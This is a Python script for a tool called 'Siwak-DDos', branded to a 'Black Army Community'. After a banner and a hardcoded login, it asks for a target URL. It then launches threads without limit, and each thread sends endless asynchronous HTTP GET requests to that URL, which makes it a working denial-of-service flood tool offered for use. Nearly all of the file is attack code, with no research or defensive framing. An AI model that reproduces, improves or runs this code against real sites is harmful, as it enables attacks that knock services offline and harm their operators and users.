import colorama
import threading 
import requests
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os



#//Gui Start//#
headers = {
  "User-Agent": "Siwak"
}
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
print("""
\033[32m 

[*] gh repo clone s3cr3tmod-xp/Siwak-DDos

""")
time.sleep(5)

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
print("""
\033[37m 

[✓] BLACK ARMY COMMUNITY

""")
time.sleep(5)
print("Loading komplit.....!")
time.sleep(1)
if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(5)
attemps = 0
banner = r"""
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒╔═════════╗▒▒╔══╗▒▒╔══╗▒▒▒▒▒▒╔══╗▒▒▒▒╔═══════╗▒▒▒▒╔══╗▒▒▒╔══╗▒▒▒
▒▒╔╝  ╔═══╗  ║▒▒║  ║▒▒║  ║▒▒▒▒▒▒║  ║▒▒▒╔╝ ╔═══╗ ╚╗▒▒▒║  ║▒▒╔╝ ╔╝▒▒▒
▒▒║  ╔╝▒▒▒╚══╝▒▒║  ║▒▒║  ║▒╔══╗▒║  ║▒▒╔╝ ╔╝▒▒▒╚╗ ╚╗▒▒║  ║╔╝ ╔╝▒▒▒▒▒
▒▒║  ║▒▒▒▒▒▒▒▒▒▒║  ║▒▒║  ║▒║  ║▒║  ║▒▒║  ║▒▒▒▒▒║  ║▒▒║  ╚╝ ╔╝▒▒▒▒▒▒
▒▒║  ╚═══════╗▒▒║  ║▒▒║  ║▒║  ║▒║  ║▒▒║  ║▒▒▒▒▒║  ║▒▒║  ╔╗ ╚╗▒▒▒▒▒▒
▒▒╚═══════╗  ║▒▒║  ║▒▒║  ║▒║  ║▒║  ║▒▒║  ╚═════╝  ║▒▒║  ║╚╗ ╚╗▒▒▒▒▒
▒▒╔═══════╝ ╔╝▒▒║  ║▒▒║  ╚═╝  ╚═╝  ║▒▒║  ╔═════╗  ║▒▒║  ║▒▒╚╗ ╚╗▒▒▒
▒▒╚═════════╝▒▒▒╚══╝▒▒╚═════╝╚═════╝▒▒╚══╝▒▒▒▒▒╚══╝▒▒╚══╝▒▒▒╚══╝▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
""".replace('▒▒', '▒▒')
print(Colorate.Horizontal(Colors.green_to_red, banner))
banner = """
╔═════════════════════════════════════════════════════════════════╗
║  Design By: KunFayakun                                          ║
║  0wner: Z'black [ Black Army Community ]                        ║
╚═════════════════════════════════════════════════════════════════╝
"""                       
print(Colorate.Horizontal(Colors.red_to_blue, banner))

while attemps < 100:
    print("┏━━⬣")
    username = input("\033[38;5;111m┗>Username: \033[30m")
    password = input("\033[38;5;111m┗> Password: \033[30m")

    if username == 'swk00' and password == 'swk00':
        print("\033[32m⟩⟩ Aksi solidaritas untuk PALESTINE \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
#//Gui End//#
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0
print("\033[38;5;111m┏━━⬣")
url = input("\033[38;5;111m┗━> Url-target: \033[37m")
print()
time.sleep(2)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url


print(url)
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
         
        if response.status == 200:
          r += 1
          reqs.append(response.status)
          print()
          sys.stdout.write(f"\033[48;5;7m\033[30mWebsite\033[0m \033[32m{str(url)}\033[38;5;39m Requests\033[37m•> {str(len(reqs))}\r")
          sys.stdout.write(f"\033[37mWebsite \033[37m{str(url)} \033[38;5;39mtime \033[33m•> {final}\r")
          sys.stdout.write(f"\033[38;5;37mWebsite \033[38;5;166m{str(url)} \033[38;5;39mStatus Code \033[32m•> {str(response.status)}\r") 
        else:
          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)


def run():
    loop.run_forever(asyncio.run(main()))

if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass

